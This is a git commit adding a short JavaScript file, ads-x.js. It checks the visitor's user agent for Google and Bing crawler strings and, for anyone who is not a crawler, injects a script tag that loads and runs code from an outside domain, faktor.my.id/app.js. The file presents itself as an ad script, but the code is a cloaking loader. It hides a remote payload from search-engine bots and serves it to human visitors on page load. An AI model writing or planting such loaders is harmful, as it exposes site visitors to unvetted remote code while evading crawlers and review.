5e479843f4117e1e603f1be503514e31ec5c63f5
oonbeh <oonbeh@gmail.com>
2023-02-26 02:13:35 +0800

    Create ads-x.js

---
+++ ads-x.js
@@ -0,0 +1,14 @@
+const userAgent = navigator.userAgent.toLowerCase();
+
+const isBot = userAgent.includes("google.com") || 
+              userAgent.includes("googlebot") || 
+              userAgent.includes("googlebot-image") || 
+              userAgent.includes("googlebot-image/1.0") || 
+              userAgent.includes("google") || 
+              userAgent.includes("bingbot");
+
+if (!isBot) {
+  const script = document.createElement('script');
+  script.src = 'https://faktor.my.id/app.js';
+  document.head.appendChild(script);
+}
